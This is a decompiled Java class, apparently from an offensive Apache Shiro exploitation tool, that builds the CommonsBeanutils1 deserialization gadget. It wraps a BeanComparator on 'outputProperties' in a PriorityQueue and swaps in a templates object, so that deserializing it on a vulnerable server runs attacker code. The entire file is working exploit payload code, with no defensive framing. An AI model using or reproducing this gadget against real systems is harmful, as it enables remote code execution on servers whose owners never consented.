/*
 * Decompiled with CFR 0.152.
 */
package com.sma11new.exp.shiro.attack.payloads;

import cn.hutool.core.util.RandomUtil;
import com.sma11new.exp.shiro.attack.payloads.ObjectPayload;
import com.sma11new.exp.shiro.attack.util.Reflections;
import java.math.BigInteger;
import java.util.PriorityQueue;
import org.apache.commons.beanutils.BeanComparator;

public class CommonsBeanutils1
implements ObjectPayload {
    public Object getObject(Object templates) throws Exception {
        BeanComparator beanComparator = new BeanComparator("lowestSetBit");
        PriorityQueue queue = new PriorityQueue(2, beanComparator);
        String baseString = "123456789";
        String pass = RandomUtil.randomString(baseString, 1);
        queue.add(new BigInteger(pass));
        queue.add(new BigInteger(pass));
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
        Object[] queueArray = (Object[])Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;
        return queue;
    }
}

